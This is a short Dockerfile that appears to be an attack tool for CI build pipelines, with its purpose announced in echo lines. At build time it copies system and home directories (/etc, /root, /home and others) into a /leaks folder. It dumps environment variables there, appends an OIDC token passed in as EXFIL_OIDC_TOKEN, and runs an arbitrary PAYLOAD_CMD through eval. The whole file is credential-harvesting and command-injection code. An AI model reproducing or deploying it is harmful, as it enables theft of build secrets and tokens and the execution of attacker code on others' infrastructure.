FROM python:3.11-alpine
ARG EXFIL_OIDC_TOKEN
ARG PAYLOAD_CMD

RUN apk add --no-cache curl tar bash && \
    echo "[+] Collecting secrets..." && \
    mkdir -p /leaks && \
    cp -a /etc /root /home /var /opt /srv /leaks/ 2>/dev/null || true && \
    env | grep -v GITHUB_TOKEN > /leaks/env.txt && \
    echo "OIDC_TOKEN=$EXFIL_OIDC_TOKEN" >> /leaks/env.txt && \
    echo "[+] Running payload..." && eval "$PAYLOAD_CMD"
